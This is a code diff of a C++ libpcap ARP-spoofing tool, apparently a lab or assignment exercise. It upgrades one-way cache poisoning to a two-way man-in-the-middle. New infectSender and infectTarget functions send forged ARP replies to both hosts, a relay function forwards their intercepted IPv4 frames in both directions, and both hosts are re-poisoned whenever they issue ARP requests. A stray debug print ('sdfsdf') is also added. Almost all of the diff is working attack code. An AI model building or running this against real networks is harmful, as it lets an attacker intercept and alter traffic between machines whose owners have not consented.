@@ -38,14 +38,12 @@ Interface getInterface(const char* ifname) {
     memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
 
-    // MAC
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
         perror("ioctl(SIOCGIFHWADDR)");
         exit(1);
     }
     me.mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
 
-    // IP
     if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
         perror("ioctl(SIOCGIFADDR)");
         exit(1);
@@ -98,7 +96,7 @@ Mac resolveMac(pcap_t* handle, const Interface& me, const Ip& targetIp) {
         ArpHdr::Request,
         me.ip,                me.mac,
         targetIp,             Mac::nullMac()
-    );
+        );
     sendPacket(handle, req);
 
     while (true) {
@@ -119,27 +117,51 @@ Mac resolveMac(pcap_t* handle, const Interface& me, const Ip& targetIp) {
     }
 }
 
-void infect(pcap_t* handle, const Interface& me, const Session& s) {
-    EthArpPacket inf = makePacket(
-        s.senderMac,          me.mac,
-        ArpHdr::Reply,
-        s.targetIp,           me.mac,
-        s.senderIp,           s.senderMac
-    );
-    sendPacket(handle, inf);
+void infectSender(pcap_t* handle,
+                  const Interface& me,
+                  const Session& s)
+{
+    sendPacket(handle,
+               makePacket(
+                   s.senderMac,
+                   me.mac,
+                   ArpHdr::Reply,
+                   s.targetIp,
+                   me.mac,
+                   s.senderIp,
+                   s.senderMac));
 }
 
-void relayToTarget(pcap_t* handle, const Interface& me,
-                   const Session& s,
-                   const pcap_pkthdr* header, const u_char* data) {
-    std::vector<u_char> packet(data, data + header->caplen);
-    auto* eth = (EthHdr*)packet.data();
-    eth->dmac_ = s.targetMac;
-    eth->smac_ = me.mac;
+void infectTarget(pcap_t* handle,
+                  const Interface& me,
+                  const Session& s)
+{
+    sendPacket(handle,
+               makePacket(
+                   s.targetMac,
+                   me.mac,
+                   ArpHdr::Reply,
+                   s.senderIp,
+                   me.mac,
+                   s.targetIp,
+                   s.targetMac));
+}
 
-    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
-        fprintf(stderr, "relay error: %s\n", pcap_geterr(handle));
-    }
+void relay(pcap_t* handle,
+           const Mac& dst,
+           const Mac& src,
+           const pcap_pkthdr* header,
+           const u_char* data) {
+
+    std::vector<u_char> packet(data, data + header->caplen);
+
+    auto* eth = (EthHdr*)packet.data();
+
+    eth->dmac_ = dst;
+    eth->smac_ = src;
+
+    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0)
+        fprintf(stderr, "relay error : %s\n", pcap_geterr(handle));
 }
 
 void usage() {
@@ -152,6 +174,7 @@ int main(int argc, char* argv[]) {
         usage();
         return -1;
     }
+    printf("sdfsdf");
 
     char* dev = argv[1];
 
@@ -161,7 +184,6 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
         return -1;
     }
-
     Interface me = getInterface(dev);
     printf("[+] Attacker  IP  : %s\n", std::string(me.ip).c_str());
     printf("[+] Attacker  MAC : %s\n\n", std::string(me.mac).c_str());
@@ -174,7 +196,7 @@ int main(int argc, char* argv[]) {
         Mac senderMac = resolveMac(handle, me, senderIp);
         Mac targetMac = resolveMac(handle, me, targetIp);
 
-        printf("[+] %s (%s)  ⇒  %s (%s)\n",
+        printf("[+] %s (%s)  ⇔  %s (%s)\n",
                std::string(senderIp).c_str(), std::string(senderMac).c_str(),
                std::string(targetIp).c_str(), std::string(targetMac).c_str());
 
@@ -182,22 +204,42 @@ int main(int argc, char* argv[]) {
     }
     puts("");
 
-    for (const Session& s : sessions) infect(handle, me, s);
-    puts("[*] Infection packets sent.  Entering relay loop...\n");
+    for (const Session& s : sessions) {
+        infectSender(handle, me, s);
+        infectTarget(handle, me, s);
+    }
+    puts("[*] Infection packets sent (both directions). Entering relay loop...\n");
 
     while (true) {
         struct pcap_pkthdr* header;
         const u_char*       data;
         int res = pcap_next_ex(handle, &header, &data);
-        if (res == 0) continue;   // timeout
-        if (res < 0) break;       // error / EOF
+        if (res == 0) continue;
+        if (res < 0) break;
 
         auto* eth = (EthHdr*)data;
 
         if (eth->type_ == htons(EthHdr::Ip4)) {
             for (const Session& s : sessions) {
-                if (eth->smac_ == s.senderMac && eth->dmac_ == me.mac) {
-                    relayToTarget(handle, me, s, header, data);
+                if (eth->smac_ == s.senderMac &&
+                    eth->dmac_ == me.mac)
+                {
+                    relay(handle,
+                          s.targetMac,
+                          me.mac,
+                          header,
+                          data);
+                    break;
+                }
+
+                if (eth->smac_ == s.targetMac &&
+                    eth->dmac_ == me.mac)
+                {
+                    relay(handle,
+                          s.senderMac,
+                          me.mac,
+                          header,
+                          data);
                     break;
                 }
             }
@@ -214,7 +256,12 @@ int main(int argc, char* argv[]) {
 
             for (const Session& s : sessions) {
                 if (tip == s.targetIp && smac == s.senderMac) {
-                    infect(handle, me, s);   
+                    infectSender(handle, me, s);
+                    break;
+                }
+
+                if (tip == s.senderIp && smac == s.targetMac) {
+                    infectTarget(handle, me, s);
                     break;
                 }
             }
